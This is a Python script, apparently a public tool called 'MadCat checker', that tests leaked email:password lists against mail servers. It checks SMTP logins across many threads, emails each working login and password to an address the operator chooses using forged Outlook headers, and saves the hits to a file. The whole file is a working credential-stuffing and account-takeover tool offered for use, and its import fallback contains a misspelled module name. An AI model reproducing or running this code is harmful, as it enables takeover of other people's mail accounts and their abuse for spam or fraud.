import socket,threading,base64,datetime,sys,ssl,smtplib,time,re,os,sys,random,signal,queue
from dns import resolver
from colorama import *
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication

# ~~~~ SMTP checker script ~~~~~~~~~~~~~~~~~~
# ~~~~ MadCat checker v1.0 ~~~~~~~~~~~~~~~~~~
# ~~~~ https://github.com/aels/mailtools ~~~~
# ~~~~ contact: https://t.me/freebug ~~~~~~~~

if sys.version_info[0] < 3:
	raise Exception("Python 3 or a more recent version is required.")
try:
	from alive_progress import alive_bar
except ImportError:
	from pip._internal import main as pip
	pip(['install', '--user', 'alive_progress'])
	from alive_progresss import alive_bar

class c:
	HEAD = "\033[95m"
	BLUE = "\033[94m"
	CYAN = "\033[96m"
	GREEN = "\033[92m"
	WARN = "\033[93m"
	FAIL = "\033[91m"
	END = "\033[0m"
	BOLD = "\033[1m"
	UNDERLINE = "\033[4m"

def get_mx_server(domain):
	global mx_cache
	if not domain in mx_cache:
		try:
			for data in resolver.query(domain, 'MX'):
				mx_host = data.exchange.to_text()[0:-1]
				break
			s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			s.setblocking(0)
			s.settimeout(1)
			for h in [mx_host,domain,'smtp.'+domain,'mail.'+domain,'webmail.'+domain,'mx.'+domain]:
				for p in [587,25,465]:
					if p==465:
						s = ssl.wrap_socket(s)
					try:
						s.connect((h, p))
						s.close()
						mx_cache[domain] = (h, p)
						return mx_cache[domain]
					except:
						pass
		except:
			pass
		mx_cache[domain] = False
	return mx_cache[domain]

def quit(signum, frame):
	print('\n\033[93mExiting...\033[00m\n')
	sys.exit(0)

def is_valid_email(email):
	return re.match(r'^[a-z0-9._+-]+@[a-z0-9.-]+\.[a-z]{2,}$', email.lower())

def find_email_password_indexes(lines):
	email_index = False
	password_index = False
	for line in lines:
		line = re.sub('[;,\t| ]', ':', line.lower())
		email = re.search(r'[a-z0-9._+-]+@[a-z0-9.-]+\.[a-z]{2,}', line)
		if email_index is False and email:
			email_index = line.split(email.group(0))[0].count(':') or 0
		if password_index is False and re.search(r'@.+12345', line):
			password_index = line.split('12345')[0].count(':')
		if email_index is not False and password_index is not False:
			return (email_index, password_index)
	exit('can\'t find email or password field in sample line:\n'+line)
	

def print_statuses(thread_name, thread_status):
	global threads_statuses, threads_count, threads_counter, goods
	sys.stdout.write('\033[F'*threads_count+'\033[F')
	threads_statuses[thread_name] = thread_status
	print((
		f'[ cpu load: {c.BOLD}{round(os.getloadavg()[0]/os.cpu_count(),2)}{c.END} ]'+
		f'[ threads: {c.BOLD}{threads_counter}{c.END} ]'+
		f'[ goods: {c.BOLD}{c.GREEN}{goods}{c.END} ]'
	).rjust(144))
	for i in range(threads_count):
		print(threads_statuses['thread'+str(i)] or '')

def smtp_connect(smtp_server, port, user, password):
	try:
		if port == 587:
			tls_context = ssl.create_default_context()
			tls_context.check_hostname = False
			tls_context.verify_mode = ssl.CERT_NONE
			server_obj = smtplib.SMTP(smtp_server, port, timeout=1)
			server_obj.ehlo()
			server_obj.starttls(context=tls_context) 
		elif port == 465:
			server_obj = smtplib.SMTP_SSL(smtp_server, port, timeout=1)
		else:
			server_obj = smtplib.SMTP(smtp_server, port, timeout=1)
	except:
		server_obj = smtplib.SMTP(smtp_server, port, timeout=1)
	server_obj.ehlo()
	server_obj.login(user, password)
	return server_obj

def smtp_sendmail(server_obj, smtp_server, port, smtp_user, password):
	global verify_email
	message = MIMEMultipart()
	message['From'] = f'MadCat checker <{smtp_user}>'
	message['To'] = verify_email
	message['Subject'] = 'new SMTP from MadCat checker'
	message.attach(MIMEText(f'{smtp_server}|{port}|{smtp_user}|{password}', 'html', 'utf-8'))
	headers = 'Return-Path: '+mail_from+'\n'
	headers+= 'Reply-To: '+mail_from+'\n'
	headers+= 'X-Priority: 1\n'
	headers+= 'X-MSmail-Priority: High\n'
	headers+= 'X-Mailer: Microsoft Office Outlook, Build 10.0.5610\n'
	headers+= 'X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1441\n'
	message_raw = headers + message.as_string()
	server_obj.sendmail(smtp_user, verify_email, message_raw)

def worker_item(quee, results):
	global threads_counter, verify_email, goods
	self = threading.current_thread()
	while True:
		if quee.empty():
			break
		else:
			smtp_server, port, smtp_user, password = quee.get()
			results.put((self.name,f'{c.WARN}{c.BOLD}trying mx for{c.END} {smtp_user}:{password}'))
			if not smtp_server or not port:
				try:
					smtp_server, port = get_mx_server(smtp_user.split('@')[1])
				except:
					continue
			results.put((self.name,f'{c.BOLD}connecting to{c.END} {smtp_server}|{port}|{smtp_user}|{password}'))
			try:
				server_obj = smtp_connect(smtp_server, port, smtp_user, password)
				try:
					smtp_sendmail(server_obj, smtp_server, port, smtp_user, password)
					worker_results.put((self.name,f'{c.GREEN}{c.BOLD}{smtp_user}:{password}{c.END} sent to {verify_email}'))
					open(smtp_filename, 'a').write(f"{smtp_server}|{port}|{smtp_user}|{password}\n")
					goods += 1
				except:
					pass
				server_obj.quit()
			except Exception as e:
				e = str(e).strip()
				results.put((self.name,f'connection error: {c.FAIL}{c.BOLD}{e}{c.END}'))
	threads_counter -= 1

signal.signal(signal.SIGINT, quit)
quee = queue.Queue()
results = queue.Queue()
goods = 0
threads_counter = 0
threads_count = 30
threads_statuses = {}
mx_cache = {}
try:
	lines = open(sys.argv[1],'r').read().splitlines()
	smtp_filename = sys.argv[1].split('.')
	smtp_filename[-2] = smtp_filename[-2]+'_smtp'
	smtp_filename = '.'.join(smtp_filename)
	verify_email = sys.argv[2]
	if not is_valid_email(verify_email):
		raise
except:
	exit(f'usage: \npython3 {sys.argv[0]} list.txt verify_email@example.com')
email_index, password_index = find_email_password_indexes(lines)
for line in lines:
	if line.count('|')==3:
		quee.put((line.split('|')))
	else:
		line = re.sub('[;,\t| ]', ':', line)
		fields = line.split(':')
		if fields[email_index] and len(fields[password_index])>7 and not re.search(r'@(gmail\.com|mail\.ru)', fields[email_index]):
			quee.put((False,False,fields[email_index],fields[password_index]))
print(f'email_index: {c.BOLD}{str(email_index)}{c.END}')
print(f'password_index: {c.BOLD}{str(password_index)}{c.END}')
print(f'verification email: {c.BOLD}{verify_email}{c.END}')
total = quee.qsize()
sys.stdout.write('\n'*threads_count)
for i in range(threads_count):
	threading.Thread(name='thread'+str(i),target=worker_item,args=(quee,results),daemon=True).start()
	threads_counter += 1
	threads_statuses['thread'+str(i)] = 'no data'
with alive_bar(total,bar='blocks',title='Progress:') as progress_bar:
	while True:
		if not results.empty():
			thread_name, thread_status = results.get()
			if 'trying' in thread_status:
				progress_bar()
			print_statuses(thread_name, '\b'*10+thread_status)
		if threads_counter == 0 and quee.empty():
			print('\b'*10+f'{c.GREEN}All done.{c.END}')
			break
